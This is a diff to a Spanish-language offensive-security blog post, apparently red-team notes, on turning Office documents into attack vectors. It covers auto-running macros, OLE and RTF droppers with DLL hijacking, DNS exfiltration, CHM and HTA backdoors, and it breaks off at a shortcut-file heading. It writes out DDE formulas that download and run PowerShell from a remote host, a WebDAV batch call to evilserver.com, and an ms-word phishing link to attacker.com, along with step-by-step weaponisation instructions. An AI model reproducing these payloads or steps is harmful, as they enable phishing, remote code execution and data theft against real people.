@@ -1,5 +1,5 @@
 ---
-title: 'Desarrollo de vectores de ataques'
+title: 'Desarrollando vectores de ataques'
 description: ''
 pubDate: 'May 12 2023'
 slug: 'social-eng-attack-vectors/desarrollo_de_vectores_de_ataques'
@@ -7,9 +7,9 @@ slug: 'social-eng-attack-vectors/desarrollo_de_vectores_de_ataques'
 
 import { Image } from 'astro:assets'
 
-# Desarrollo de un macro personalizado
+[www.source-code.biz](https://www.source-code.biz/)
 
-[Codigo fuente](https://www.source-code.biz/)
+<h3>Desarrollo de un macro personalizado</h3>
 
 _Caso 1: Aprovecharemos las propiedades del archivo para ocultar el payload y StdIn para evitar el logging_
 
@@ -50,3 +50,160 @@ Recupera el hostname y el username, lo parsea a base64 y finalmente lo envia a u
 [Codigo fuente](https://gist.github.com/anonymous/db37338ba9c59336a0ee3d324d152bc9)
 
 _caso 5: RTF + firma binaria + hijacking DLL + MSF loader personalizado_
+
+El siguiente macro combina el comportamiento RTF de los objetos OLE embebidos en el directorio TEMP con DLL hijacking de un ejecutable(kaspersky's kavremover.exe) confiable(firmado) y un loader personalizado. 
+
+<b>Caso 5:RTF + Signed binary + DLL hijacking + Custom MSF Loader</b>
+
+Los archivos RTF contienen objetos OLE embebidos su comportamiento es una vez abiertos, automaticamente dejan caer el objeto OLE embebido en el directorio TEMP.
+
+Si encontramos un DLL hijacking, podemos embeberlos en un archivo RTF. Así una vez abiertos seran dropeados en el mismo directorio(TEMP).
+
+<b>caso 6: Embeber ejecutables en un macro(execubatle2vbs)</b>
+
+Contiene un ejecutable en forma de trozos hexadecimales. El ejecutable embebido va ser 're-ensamblado', luego dropeado en un directorio y ejecutado.
+
+<b>Caso 7: Macro Network-tracing</b>
+
+Este macro realizada sniffing de la red aprovechando PowerShell's network tracing capabilities, deja caer y ejecuta un script PS1 que hace todo el trabajo pesado.
+
+[Ejemplo](https://gist.github.com/anonymous/a3ebd8928135ae29fc341c6036bc7eac)
+
+<b>Casos 8: Perspectiva APT: Multi-stage macro usando DNS para la recuperacion del payload y exfiltracion.</b>
+
+Para este macro veremos tacticas, tecnicas y procedimientos (TTPs).
+
+Se combina varias tecnicas para evadir defensas y mantenerse sigiloso [aquí un ejemplo del malware](https://gist.github.com/anonymous/d0da355e5c21a122866808d37234cd5d)
+
+Para entender mejor la estructura de la consulta DNS.
+
+
+| - | - |
+| ---- | -----|
+| Subdominio utilizado para solicitar BotID | \[00][botid]00000\[base36 random number]30                |
+| Subdominio usado mientras realizas la transferencia del archivo      | \[00]\[botid]00000\[base36 random number]232A\[hex_filename]\[i-counter]      |
+| Subdominio usado mientras realizas la actualizacion del archivo      | \[00]\[botid][cmdid][partid][base36 random number][48-hex-char-of-file-content] |
+
+
+<b>Caso 9: La fruta prohibida: Macro realizando inyeccion directa de shellcode</b>
+
+Hay muchas tecnicas para inyectar codigo directamente, desde VBA puede interactuar con Windows APIs.
+
+Soluciones de evasion [to rule them all](https://labs.withsecure.com/content/dam/labs/docs/one-template-to-rule-them-all-t2.pdf)
+
+<b>Caso 10: Macros en PowerPoint</b>
+
+Autores de malware parecen estar usando PowerPoint y Custom Actions en vez de Word o Excel con macros.
+
+Para usar Custon Actions en PowerPoint una vez que el tab de desarrollo este habilidato (File - Options - Customize Ribbon) ir a Developer y clic en Visual Basic, luego clic en insertar y escoger Modulo, aquí es donde vas a poner el malware.
+
+Ahora creamos el mecanismo de disparo:
+
+Vamos a ir a Insert, clic en el item que queremos asociar con el action y clic en Action.
+Luego elejimos Mouse over o Mouse Clic, luego en Run macro para asociar el modulo que hemos insertado anteriormente con la accion.
+
+Sin usar Custom Actions añadimos un custom Office 2007 UI.
+
+- Insertamos el modulo que queremos y guardamos la presentacion PowerPoint con un tipo de extension que soporte macros.
+
+- Unzip el PowerPoint.
+
+- Editamos: _rels/.rels file to add the following line right before the last \</Relationships>.\<Relationship Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target='/customUI/customUI.xml' Id='Rd6e72c29d34a427e' />
+
+- Creamos un directorio en el mismo nivel que _rels llamado "customUI".
+
+- Dentro de customUI creamos customUI.xml que contenga: <i> \<customUI xmlns=http://schemas.microsoft.com/office/2006/01/customui onload="name of your VBA module"> \</customUI> </i>
+
+- Zip el directorio completo y lo renombramos al nombre original con el que lo guardamos.
+
+Ahora el modulo VBA correra automaticamente cuando el usuario habilite las macros. 
+
+[Cuando las macros estan desabilitadas globalmente](https://github.com/Pepitoh/Vbad)
+
+<h3> Abusando las capacidades de Office </h3>
+
+Microsoft Office Suite contiene funcionalidades para meterse a la red que aprovecharemos.
+
+<b>Caso 1: Object Linking y Objetos Embebidos (OLE) </b>
+
+Por ejemplo un usuario puede embeber un spreadsheet (que es data que pertenece a la aplicacion spreadsheet) en un documento word-processing. A la hora de usar objetos OLE podemos personalizar el icono y la extension.
+
+Cuando la aplicacion word-processing muestre el documento al usuario, puede entablar que la data del spreadsheet pertenece a la aplicacion del spreadsheet y el word-processing puede interactuar con la aplicacion del spreadsheet para mostrar la data del spreadsheet al usuario.
+
+No hay limite de que podemos embeber en documentos Office aprovechando capacidades OLE como: VBA, JS, HTA, CHM, EXE, etc.
+
+Un ejemplo de como podemos activar el objeto OLE dentro del archivo PPSM (PowerPoint). Primero insertamos el archivo embebido.
+
+- Ir a Insert tab.
+
+- Clic en Object.
+
+- Luego en el tipo de objeto listamos el paquete a escoger y buscamos nuestro archivo a embeber.
+
+Ahora configuramos un mecanismo automatico usando animaciones personalizadas.
+
+- Escoge el objeto OLE embebido. Ir a Animations Tab y clic en Add Navigation. Del menu desplegable escoger OLE Action verbs y clic en Activate Contents.
+
+- De nuevo en Animation tab escoger Animation Pane. Navegar a Animation Pane que se muestre, deberiamos ver un Object. Clic en la flecha hacia abajo al lado derecho del objeto para activar el menu y escoger Start After Previous Option.
+
+Ahora cuando el PowerPoint se abra activara el OLE y aparecera un recuadro indicando el consentimiento del usuario para ejecutar objetos embebidos.
+
+<b>Caso 2: Explotando MS16-032 via DDE Excel sin macros</b>
+
+DDE(Dynamic Data Exchange) es una tecnologia vieja de Microsoft que facilita la transferencia de datos entre apps y usa memoria compartida, una forma de Inter-Process Communication (IPC).
+
+Nota lo siguiente: <i> =cmd|'/c calc.exe'!A1 </i> excel ejecutara la primera parte cmd.exe la segunda parte son los argumentos que estan en comillas y existen restrincciones de longitud de strings. Es por eso que pasamos como argumento PowerShell a la cmd.
+
+```bash
+=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("https://domain.com/script.base64");powershell -e $e'!A1
+
+# y el siguiente para decodear:
+
+=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("https://domain.com/script.ps1");IEX $e'!A1
+
+# en el caso de un atacante interno ejecutamos un BAT en un servidor WebDAV
+
+cmd|'/c \\evilserver.com\sp.bat;IEX $e'!A1
+```
+
+<b>Caso 3: Office-handled links</b>
+
+Microsoft manejara este enlace que puede ser usado para phishing
+```html
+
+<a href="ms-word:nft|u|http://attacker.com/malicious.docx">Clic plz</a>
+
+```
+
+<h3> Extensiones poco comunes </h3>
+
+Hay sin fin de posibilidades en weaponizing/backdooring archivos poco comunes.
+
+<b>Archivos de ayuda en HTML compilado (CHM) de Microsoft</b>
+
+Es un formato de ayuda, consiste en recolectar paginas HTML, un indice y otras herramientas de navegación.
+
+Los archivos son comprimidos y desplegados en un formato binario con extension CHM, para compilar HTML. El formato es a menudo usado para documentacion de software.
+
+No es necesario desbloquear el archivo al descagarlo del mail cuando lo hacemos por la macro.
+
+Combinaremos un archivo CHM y un JS backdoor personalizado y luego usaremos el backdoor para realizar un ataque multi-stage. Nuestro JS personalizado utilizara una tecnica ofensiva sacada a la luz por Win32/poweliks malware.
+
+[Para ver la tecnica en detalle](https://www.stormshield.com/news/poweliks-command-line-confusion/)
+
+[Insertamos el HTML dentro del CHM para atacar](https://gist.github.com/anonymous/15e99d0fd883692bd2e300634ed3c09b)
+
+[Ataque Multi-stage FULL](https://gist.github.com/anonymous/ce4e2c4c83d900739395c695cc1ec55e)
+
+
+<h3>Archivos de aplicaciones HTML (HTA)</h3>
+
+Como documentos de Microsoft, HTAs son aplicaciones full-emplumadas. Estas apps son confiables y empaquetadas todo el poder de Internet Explorer
+
+Para crear archivos de ataque HTA a demas de PowerShell Empire, Metasploit y SET estan: [demiguise](https://github.com/nccgroup/demiguise) y [unicorn](https://github.com/trustedsec/unicorn)
+
+Aca vemos una arma HTA que contiene nuestro [backdoor JS](https://gist.github.com/anonymous/ed8801afafae5b4755b00a11c63c244e) y podemos aplicar [tecnicas de ofuscacion](http://javascriptobfuscator.com)
+
+
+<h3>Archivos shortcut (LNK)</h3>
+
